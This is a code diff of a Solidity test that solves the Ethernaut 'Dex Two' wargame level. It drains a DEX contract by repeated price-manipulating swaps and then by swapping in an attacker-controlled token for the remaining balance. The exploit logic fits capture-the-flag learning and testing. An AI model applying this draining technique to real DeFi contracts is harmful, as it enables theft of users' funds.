@@ -45,6 +45,7 @@ contract DexTwoAttackTest is PRBTest {
 
         vm.startPrank(playerAddress, playerAddress);
 
+        // clean out one token by using the Dex One attack that still works here
         while (!drained) {
             toggle ? swapToken(token1, token2) : swapToken(token2, token1);
             toggle = !toggle;
@@ -53,20 +54,15 @@ contract DexTwoAttackTest is PRBTest {
 
         // determine which token still has a balance
         address tokenWithDexBalance = SwappableTokenTwo(token1).balanceOf(dextwoInstance) > 0 ? token1 : token2;
-        uint tokenWithDexBalanceBalance = SwappableTokenTwo(tokenWithDexBalance).balanceOf(dextwoInstance);
+        uint256 tokenWithDexBalanceBalance = SwappableTokenTwo(tokenWithDexBalance).balanceOf(dextwoInstance);
         console.log("tokenWithDexBalance BALANCE:", tokenWithDexBalanceBalance);
-        // swap attack token for token with balance
-        SwappableTokenTwo(token1).approve(playerAddress, dextwoInstance, tokenWithDexBalanceBalance);
-        DexTwo(dextwoInstance).swap(tokenWithDexBalance, address(attacker), tokenWithDexBalanceBalance);
-         
-        // reset drained var
-        drained = false;
 
-        while (!drained) {
-            toggle ? swapTokenAttacker(tokenWithDexBalance, address(attacker)) : swapToken(address(attacker), tokenWithDexBalance);
-            toggle = !toggle;
-            drained = isDexFullyDrained();
-        }
+        // swap out the token with a balance with our attacker token
+        DexTwo(dextwoInstance).swap(address(attacker), tokenWithDexBalance, tokenWithDexBalanceBalance);
+
+        // assert that we've wiped all tokens from the dex
+        assert(isDexFullyDrained());
+
 
         // // test to make sure we completed the level; submit level as player
         bool levelComplete = ethernaut.submitLevelInstance(payable(dextwoInstance));
@@ -95,25 +91,6 @@ contract DexTwoAttackTest is PRBTest {
         myTokenBalance = SwappableTokenTwo(_tokenFrom).balanceOf(playerAddress);
         console.log("DEXTWO TOKEN 1 BALANCE AFTER:", SwappableTokenTwo(token1).balanceOf(dextwoInstance));
         console.log("DEXTWO TOKEN 2 BALANCE AFTER:", SwappableTokenTwo(token2).balanceOf(dextwoInstance));
-    }
-
-    function swapTokenAttacker(address _tokenFrom, address _tokenTo) public {
-
-        // get the exchange balance of token to rob
-        uint256 exchangeBalance = SwappableTokenTwo(_tokenFrom).balanceOf(dextwoInstance);
-
-        // // determine how much to swap
-        // uint256 swapAmount;
-        // myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;
-
-        SwappableTokenTwo(_tokenFrom).approve(playerAddress, dextwoInstance, exchangeBalance);
-        SwappableTokenTwo(_tokenTo).approve(playerAddress, dextwoInstance, exchangeBalance);
-        console.log("DEXTWO _tokenFrom BALANCE BEFORE:", SwappableTokenTwo(_tokenFrom).balanceOf(dextwoInstance));
-        console.log("DEXTWO _tokenTo BALANCE BEFORE:", SwappableTokenTwo(_tokenTo).balanceOf(dextwoInstance));
-        DexTwo(dextwoInstance).swap(_tokenFrom, _tokenTo, exchangeBalance);
-        uint myTokenBalance = SwappableTokenTwo(_tokenFrom).balanceOf(playerAddress);
-        console.log("DEXTWO _tokenFrom BALANCE AFTER:", SwappableTokenTwo(token1).balanceOf(dextwoInstance));
-        console.log("DEXTWO _tokenTo BALANCE AFTER:", SwappableTokenTwo(token2).balanceOf(dextwoInstance));
     }
 
     function isDexHalfDrained() public returns (bool) {
